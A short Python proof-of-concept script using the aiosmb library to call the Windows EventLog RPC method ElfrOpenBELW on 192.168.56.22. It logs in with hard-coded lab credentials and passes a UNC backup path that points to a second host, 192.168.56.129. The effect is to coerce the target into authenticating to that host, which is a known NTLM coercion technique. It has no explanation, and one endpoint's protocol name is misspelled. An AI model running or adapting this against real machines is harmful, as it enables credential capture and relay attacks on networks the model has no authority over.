from aiosmb.dcerpc.v5.common.connection.smbdcefactory import SMBDCEFactory
from aiosmb.dcerpc.v5 import wkst
from aiosmb.dcerpc.v5.interfaces.endpointmgr import EPM
from aiosmb.dcerpc.v5.dtypes import MAXIMUM_ALLOWED
from aiosmb.wintypes.ntstatus import NTStatus
from aiosmb import logger
from aiosmb.dcerpc.v5.dtypes import NULL
from aiosmb.dcerpc.v5.interfaces.endpointmgr import EPM
from aiosmb.connection import SMBConnection
from aiosmb.dcerpc.v5.connection import DCERPC5Connection
from aiosmb.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE,\
	RPC_C_AUTHN_LEVEL_CONNECT,\
	RPC_C_AUTHN_LEVEL_CALL,\
	RPC_C_AUTHN_LEVEL_PKT,\
	RPC_C_AUTHN_LEVEL_PKT_INTEGRITY,\
	RPC_C_AUTHN_LEVEL_PKT_PRIVACY,\
	DCERPCException, RPC_C_AUTHN_GSS_NEGOTIATE

from aiosmb.dcerpc.v5.interfaces import InterfaceManager, InterfaceEndpoint
from aiosmb.dcerpc.v5.even import hElfrOpenBELW
		
class EVENRPC(InterfaceManager):
	def __init__(self, connection, endpoint):
		super().__init__(connection, endpoint)

	@classmethod
	def endpoints(cls):
		return [
			InterfaceEndpoint('ncan_np', "82273fdc-e32a-18c3-3f78-827929dc23ea", "0.0", pipename=r'\eventlog', authlevel=RPC_C_AUTHN_LEVEL_PKT_PRIVACY),
			InterfaceEndpoint('ncacn_ip_tcp', "82273fdc-e32a-18c3-3f78-827929dc23ea", "0.0", authlevel=RPC_C_AUTHN_LEVEL_PKT_PRIVACY),
		]
	
	
	@staticmethod
	def create_instance(connection, endpoint):
		return EVENRPC(connection, endpoint)
	
	async def cleanup(cls):
		pass

	async def hElfrOpenBELW(self, backupFileName):
		return await hElfrOpenBELW(self.dce, backupFileName)

async def amain():
	host = '192.168.56.22'
	user = 'vagrant'
	password = 'vagrant'
	domain = 'NORTH'


	rpc, err = await EVENRPC.from_ntlm_params(host, user, password, domain)
	if err is not None:
		raise err
	print(rpc)
	async with rpc:
		print(1)
		res, err = await rpc.hElfrOpenBELW(backupFileName='\\??\\UNC\\192.168.56.129\\aa')
		if err is not None:
			raise err

if __name__ == '__main__':
	import asyncio
	
	asyncio.run(amain())